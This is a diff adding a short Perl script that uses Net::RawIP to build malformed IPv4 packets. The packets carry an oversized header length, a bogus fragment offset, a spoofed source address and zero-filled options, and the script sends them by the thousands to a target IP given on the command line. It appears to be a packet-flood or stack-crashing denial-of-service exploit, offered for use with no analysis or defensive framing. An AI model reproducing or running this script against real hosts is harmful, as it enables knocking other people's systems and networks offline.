@@ -1,0 +1,30 @@
+#!/usr/bin/perl 
+
+# This script will not works on *BSD because it does generate an incomplete ip
+# packet.
+# You have to use Linux which don't think that it is more clever than a
+# programmer   
+
+require 'getopts.pl';
+use Net::RawIP;
+Getopts('t:n:');
+die "Usage $0 -t <ip of the target> -n <thousands of the times>" unless ($opt_t && $opt_n);
+
+@data = split (//,"0"x20);
+$p = new Net::RawIP({ 
+                    ip => { 
+		           ihl => 11,
+			   tot_len => 44,
+			   tos => 0,
+			   ttl => 255,
+			   id => 1999,
+			   frag_off => 16383,
+			   protocol => 17,
+			   saddr => '1.1.1.1',
+			   daddr => $opt_t
+			  },
+	            generic => {}		   
+                    });
+$p->optset(ip => { type => [@data] , data => [@data] });
+$p->send(0,$opt_n*1000);
+ 		           
